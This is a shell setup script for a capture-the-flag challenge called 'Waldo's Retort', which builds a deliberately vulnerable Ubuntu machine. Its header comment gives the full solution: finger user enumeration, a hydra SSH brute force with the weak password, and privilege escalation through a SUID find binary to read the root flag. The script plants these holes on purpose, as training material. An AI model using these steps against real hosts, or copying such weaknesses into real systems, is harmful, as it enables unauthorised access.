#####################################################################
#
# Challenge: Waldo's Retort
# Author: Jack Sullivan
# Tested on: Ubuntu 16.04.1 - 16.04.4
#
# Steps:
#   1) Identify user via finger service.
#        nmap -sC -p79 <target>
#   2) Brute force user's password via SSH service.
#        hydra -l wally187 -p monkey ssh://172.16.94.135
#   3) Identify SUID binaries, and notice `find` in the list.
#        find / -perm -u=s -type f 2>/dev/null
#   3) Use SUID find with the exec argument to get the flag.
#        find /etc/passwd -exec whoami \;
#        find /etc/passwd -exec find / -iname *flag \;
#        find /etc/passwd -exec cat /root/.flag \;
#
#####################################################################

FLAG_DATA="A cynic is only a frustrated optimist."
FLAG_PATH="/root/.flag"
LONG_PASS="62wSZfTQFcaCtaNFGs5ReyxBffpgGK3fcr3dzGw68ekxdug2pytP9XTC8RG8CEDk"
REG_USER="wally187"
REG_PASS="monkey"


# Absolute path of CWD.
THIS_SCRIPT=`readlink -f $0`
THIS_PATH=`dirname $THIS_SCRIPT`


echo "[*] Updating all APT packages."
sudo apt update
sudo apt upgrade -y


echo "[*] Creating regular user."
sudo useradd --create-home --shell /bin/bash $REG_USER
# Set regular user's password to something that can be brute forced.
echo -e "$REG_PASS\n$REG_PASS" | sudo passwd $REG_USER


echo "[*] Install OpenSSH for remote login."
sudo apt install -y openssh-server
# Restrict grace time to 15 seconds.
sudo sed -i 's/^LoginGraceTime.*/LoginGraceTime 15/g' /etc/ssh/sshd_config
# Disallow root login.
sudo sed -i 's/^PermitRootLogin.*/PermitRootLogin no/g' /etc/ssh/sshd_config
# Restart SSH service
sudo systemctl restart sshd


echo "[*] Install FingerD for user enumeration."
sudo apt install -y cfingerd
sudo sed -i 's/-ALLOW_NONIDENT_ACCESS/+ALLOW_NONIDENT_ACCESS/g' /etc/cfingerd/cfingerd.conf
sudo sed -i 's/HOSTS trusted = {/HOSTS trusted = { \n  */g' /etc/cfingerd/cfingerd.conf


echo "[*] Set autologin for regular user, so they appear in finger listing."
# https://askubuntu.com/questions/819117/how-can-i-get-autologin-at-startup-working-on-ubuntu-server-16-04-1#819154
sudo mkdir -p /etc/systemd/system/getty@tty1.service.d
sudo bash -c "echo '[Service]' > /etc/systemd/system/getty@tty1.service.d/override.conf"
sudo bash -c "echo 'ExecStart=' >> /etc/systemd/system/getty@tty1.service.d/override.conf"
sudo bash -c "echo 'ExecStart=-/sbin/agetty --noissue --autologin '$REG_USER' %I linux' >> /etc/systemd/system/getty@tty1.service.d/override.conf"
sudo bash -c "echo 'Type=idle' >> /etc/systemd/system/getty@tty1.service.d/override.conf"


echo "[*] Set find as SGID."
# Doesn't work in default /bin/sh, shell when not set in /etc/passwd.
# https://pentestlab.blog/tag/suid/
# http://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
sudo chmod u+s /usr/bin/find


echo "[*] Installing inetsim for trolling."
sudo bash -c "echo 'deb http://www.inetsim.org/debian/ binary/' > /etc/apt/sources.list.d/inetsim.list"
sudo bash -c "wget -O - http://www.inetsim.org/inetsim-archive-signing-key.asc | apt-key add -"
sudo apt update
sudo apt install -y inetsim
sudo cp $THIS_PATH/inetsim.conf /etc/inetsim/inetsim.conf
sudo cp $THIS_SCRIPT/inetsim.service /etc/systemd/system/inetsim.service
sudo sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/inetsim
sudo systemctl daemon-reload
sudo systemctl enable inetsim
sudo systemctl restart inetsim


echo "[*] Place the flag."
sudo bash -c "echo $FLAG_DATA > $FLAG_PATH"
sudo chattr +i $FLAG_PATH
